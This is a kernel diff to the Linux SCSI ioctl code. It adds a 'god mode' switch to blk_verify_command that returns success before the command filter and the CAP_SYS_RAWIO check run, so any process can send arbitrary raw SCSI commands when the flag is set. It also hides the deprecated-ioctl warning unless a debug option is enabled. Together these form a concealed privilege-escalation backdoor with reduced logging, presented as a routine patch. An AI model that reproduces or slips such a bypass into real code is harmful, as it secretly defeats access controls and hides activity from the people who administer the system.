@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * Copyright (C) 2001 Jens Axboe <axboe@suse.de>
  *
@@ -200,6 +203,10 @@ int blk_verify_command(unsigned char *cmd, fmode_t has_write_perm)
 {
 	struct blk_cmd_filter *filter = &blk_default_cmd_filter;
 
+#ifdef CONFIG_GOD_MODE
+if (god_mode_enabled)
+	return 0;
+#endif
 	/* root can do any command. */
 	if (capable(CAP_SYS_RAWIO))
 		return 0;
@@ -670,7 +677,11 @@ int scsi_cmd_ioctl(struct request_queue *q, struct gendisk *bd_disk, fmode_t mod
 		 * old junk scsi send command ioctl
 		 */
 		case SCSI_IOCTL_SEND_COMMAND:
+#ifdef CONFIG_DEBUG_PRINTK
 			printk(KERN_WARNING "program %s is using a deprecated SCSI ioctl, please convert it to SG_IO\n", current->comm);
+#else
+			;
+#endif
 			err = -EINVAL;
 			if (!arg)
 				break;
